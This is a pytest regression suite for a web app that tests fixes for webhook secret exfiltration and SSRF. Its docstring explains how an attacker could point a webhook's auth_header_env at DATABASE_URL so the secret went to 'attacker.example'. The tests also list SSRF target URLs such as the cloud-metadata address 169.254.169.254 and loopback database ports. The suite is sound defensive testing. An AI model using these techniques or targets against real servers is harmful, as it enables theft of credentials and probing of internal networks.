"""Webhook auth-token exfiltration and outbound-URL (SSRF) hardening.

Before the fix, any signed-in user could store ``auth_header_env="DATABASE_URL"``
on a webhook and have the server send that environment variable's value to an
attacker's URL as a Bearer token; and the compliance check and webhooks would
call loopback, private and cloud-metadata addresses and report whether the port
was open. These tests drive the real routes as two users in two organisations.
"""

from __future__ import annotations

import uuid

import pytest

pytestmark = pytest.mark.usefixtures("db_session")

SECRET_VALUE = "super-secret-database-url-value"


def _user(db_session, org, label):
    from app.models.user import Role, User

    role = Role.query.filter_by(name="Architect").first() or Role.query.first()
    u = User(
        email=f"{label}-{uuid.uuid4().hex[:8]}@example.test",
        first_name=label,
        organization_id=org.id,
        confirmed=True,
        role=role,
    )
    u.password = uuid.uuid4().hex
    db_session.add(u)
    db_session.flush()
    return u


def _solution(db_session, org, user):
    from app.models.solution_models import Solution

    s = Solution(
        name=f"Hook solution {uuid.uuid4().hex[:6]}",
        organization_id=org.id,
        created_by_id=user.id,
        governance_status="draft",
    )
    db_session.add(s)
    db_session.flush()
    return s


@pytest.fixture
def world(db_session, make_org, client, login_as):
    org_a, org_b = make_org("a"), make_org("b")
    user_a, user_b = _user(db_session, org_a, "alice"), _user(db_session, org_b, "bob")
    sol_a, sol_b = _solution(db_session, org_a, user_a), _solution(db_session, org_b, user_b)

    class W:
        pass

    w = W()
    w.org_a, w.user_a, w.sol_a = org_a, user_a, sol_a
    w.user_b, w.sol_b = user_b, sol_b

    def as_a():
        login_as(client, user_a)
        return client

    def as_b():
        login_as(client, user_b)
        return client

    w.as_a, w.as_b = as_a, as_b
    return w


@pytest.fixture
def production_like(monkeypatch):
    """Switch the guard to non-development behaviour and resolve names to a
    public address, so tests never touch the network."""
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "internal_targets_allowed", lambda: False)
    monkeypatch.setattr(
        guard.socket, "getaddrinfo",
        lambda host, port, *a, **k: [(2, 1, 6, "", ("93.184.216.34", port))],
    )


@pytest.fixture
def http_calls(monkeypatch):
    """Record outbound HTTP; never actually send."""
    import requests

    calls = []

    class Resp:
        status_code = 200

        def json(self):
            return {}

    def fake_post(url, **kw):
        calls.append({"url": url, **kw})
        return Resp()

    monkeypatch.setattr(requests, "post", fake_post)
    return calls


def _create(client, sol_id, **body):
    return client.post(f"/api/solutions/{sol_id}/webhooks", json=body)


# --- D-1: auth_header_env -------------------------------------------------------


@pytest.mark.parametrize("name", ["DATABASE_URL", "SECRET_KEY", "AWS_SECRET_ACCESS_KEY",
                                  "webhook_token_x", "WEBHOOK_TOKEN_", "WEBHOOK_TOKEN_a",
                                  "WEBHOOK_TOKEN_X\n", "PATH", 123, ["WEBHOOK_TOKEN_X"]])
def test_create_rejects_non_allow_listed_env_name(world, production_like, http_calls, monkeypatch, name):
    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    resp = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x",
                   auth_header_env=name)
    assert resp.status_code == 400, resp.get_json()
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.filter_by(solution_id=world.sol_a.id).count() == 0
    assert http_calls == []


def test_update_rejects_non_allow_listed_env_name(world, production_like, monkeypatch):
    c = world.as_a()
    ok = _create(c, world.sol_a.id, url="https://hooks.example.com/x")
    assert ok.status_code == 201, ok.get_json()
    wid = ok.get_json()["webhook"]["id"]
    bad = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}",
                           json={"auth_header_env": "DATABASE_URL"})
    assert bad.status_code == 400
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.get(wid).auth_header_env is None


def test_exfiltration_end_to_end_secret_never_sent(world, production_like, http_calls, monkeypatch):
    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    monkeypatch.setenv("SECRET_KEY", SECRET_VALUE)
    c = world.as_a()
    r = _create(c, world.sol_a.id, url="https://attacker.example/x", auth_header_env="DATABASE_URL")
    assert r.status_code == 400
    # Create clean, then try to switch to the secret's name.
    wid = _create(world.as_a(), world.sol_a.id, url="https://attacker.example/x").get_json()["webhook"]["id"]
    r = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}",
                         json={"auth_header_env": "SECRET_KEY"})
    assert r.status_code == 400
    world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert http_calls, "the clean webhook should have been fired"
    for call in http_calls:
        assert "Authorization" not in call["headers"]
        assert SECRET_VALUE not in repr(call)


def test_existing_row_with_bad_env_name_is_not_read_at_send_time(world, production_like, http_calls, monkeypatch):
    """A row stored before the fix must not be able to leak the variable."""
    from app import db
    from app.models.spec_webhook import SpecWebhook

    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    row = SpecWebhook(solution_id=world.sol_a.id, url="https://attacker.example/x",
                      auth_header_env="DATABASE_URL", event_types=["spec_changed"])
    db.session.add(row)
    db.session.flush()

    import os
    import types

    from app.modules.solutions_product.services import drift_remediation_service as svc

    reads = []
    real_get = os.environ.get

    class EnvSpy:
        def get(self, key, default=None):
            reads.append(key)
            return real_get(key, default)

    # Only the service module's view of "os" is replaced, not the process.
    monkeypatch.setattr(svc, "os", types.SimpleNamespace(environ=EnvSpy()))
    assert svc.DriftRemediationService()._fire_single_webhook(row, {"event": "t"}) in (True, False)
    assert "DATABASE_URL" not in reads, "the environment variable was read"
    for call in http_calls:
        assert "Authorization" not in call["headers"]
        assert SECRET_VALUE not in repr(call)


def test_allow_listed_token_name_still_works(world, production_like, http_calls, monkeypatch):
    monkeypatch.setenv("WEBHOOK_TOKEN_CRM", "tok-123")
    r = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x",
                auth_header_env="WEBHOOK_TOKEN_CRM")
    assert r.status_code == 201, r.get_json()
    wid = r.get_json()["webhook"]["id"]
    t = world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert t.get_json()["success"] is True
    assert len(http_calls) == 1
    assert http_calls[0]["headers"]["Authorization"] == "Bearer tok-123"
    assert http_calls[0]["allow_redirects"] is False


# --- D-2: internal and metadata targets ----------------------------------------

BAD_URLS = [
    "http://127.0.0.1:5432/",
    "http://localhost/x",
    "https://[::1]/x",
    "http://169.254.169.254/latest/meta-data/",
    "https://10.0.0.5/x",
    "https://192.168.1.10/x",
    "https://172.16.3.4/x",
    "https://[fd00::1]/x",
    "https://[fe80::1]/x",
    "https://0.0.0.0/x",
    "ftp://example.com/x",
    "https://user:pass@example.com/x",
]


@pytest.mark.parametrize("url", BAD_URLS)
def test_webhook_create_and_update_reject_internal_urls(world, production_like, url):
    r = _create(world.as_a(), world.sol_a.id, url=url)
    assert r.status_code == 400, (url, r.get_json())
    wid = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x").get_json()["webhook"]["id"]
    u = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}", json={"url": url})
    assert u.status_code == 400, (url, u.get_json())
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.get(wid).url == "https://hooks.example.com/x"


def test_hostname_resolving_to_internal_address_is_rejected(world, monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "internal_targets_allowed", lambda: False)
    monkeypatch.setattr(guard.socket, "getaddrinfo",
                        lambda host, port, *a, **k: [(2, 1, 6, "", ("169.254.169.254", port))])
    r = _create(world.as_a(), world.sol_a.id, url="https://rebind.example.com/x")
    assert r.status_code == 400


@pytest.mark.parametrize("url", [BAD_URLS[0], BAD_URLS[1], BAD_URLS[3], BAD_URLS[4], BAD_URLS[7]])
def test_stored_internal_url_is_not_called_at_send_time(world, production_like, http_calls, url):
    from app import db
    from app.models.spec_webhook import SpecWebhook
    from app.modules.solutions_product.services.drift_remediation_service import DriftRemediationService

    row = SpecWebhook(solution_id=world.sol_a.id, url=url, event_types=["spec_changed"])
    db.session.add(row)
    db.session.flush()
    assert DriftRemediationService()._fire_single_webhook(row, {"event": "t"}) is False
    assert http_calls == []


def test_external_https_webhook_still_works(world, production_like, http_calls):
    r = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x")
    assert r.status_code == 201
    wid = r.get_json()["webhook"]["id"]
    t = world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert t.get_json()["status"] == "delivered"
    assert http_calls[0]["url"] == "https://hooks.example.com/x"


def test_localhost_webhook_still_allowed_in_testing_config(world, http_calls):
    r = _create(world.as_a(), world.sol_a.id, url="http://localhost:9000/hook")
    assert r.status_code == 201


@pytest.mark.parametrize("url", BAD_URLS[:11])
def test_compliance_check_rejects_internal_service_url(world, production_like, monkeypatch, url):
    import requests

    sent = []
    monkeypatch.setattr(requests, "get", lambda *a, **k: sent.append(a) or None)
    monkeypatch.setattr(requests, "request", lambda *a, **k: sent.append(a) or None)
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": url})
    assert r.status_code == 400, (url, r.get_json())
    assert sent == []


def test_checker_refuses_internal_url_even_when_called_directly(world, production_like, monkeypatch):
    """Scheduled checks reach ComplianceChecker without the route."""
    import requests
    from app.modules.solutions_product.services.compliance_checker import ComplianceChecker

    sent = []
    monkeypatch.setattr(requests, "get", lambda *a, **k: sent.append(a))
    out = ComplianceChecker().check(published_spec_id=1, service_url="http://169.254.169.254")
    assert out["success"] is False and sent == []


# --- timeout clamp (A-4) --------------------------------------------------------


@pytest.mark.parametrize("raw,expected", [(0, 1), (-5, 1), (1, 1), (7, 7), (30, 30),
                                          (9999, 30), ("12", 12), (2.9, 2), (None, 10)])
def test_timeout_is_clamped(raw, expected):
    from app.utils.ssrf_guard import clamp_timeout

    assert clamp_timeout(raw) == expected


@pytest.mark.parametrize("raw", ["abc", [], {}, True, float("nan"), float("inf")])
def test_timeout_non_numeric_rejected(raw):
    from app.utils.ssrf_guard import clamp_timeout

    with pytest.raises(ValueError):
        clamp_timeout(raw)


def test_compliance_check_route_400_on_non_numeric_timeout(world):
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": "https://hooks.example.com", "timeout": "abc"})
    assert r.status_code == 400


def test_compliance_check_route_passes_clamped_timeout(world, production_like, monkeypatch):
    from app.models.published_api_spec import PublishedAPISpec  # noqa: F401
    from app.modules.solutions_product.services import compliance_checker as cc

    seen = {}

    def fake_check(self, published_spec_id, service_url, timeout=10, checked_by_id=None):
        seen["timeout"] = timeout
        return {"success": True}

    monkeypatch.setattr(cc.ComplianceChecker, "check", fake_check)
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": "https://hooks.example.com", "timeout": 99999,
                                "spec_id": 1})
    assert r.status_code == 200
    assert seen["timeout"] == 30
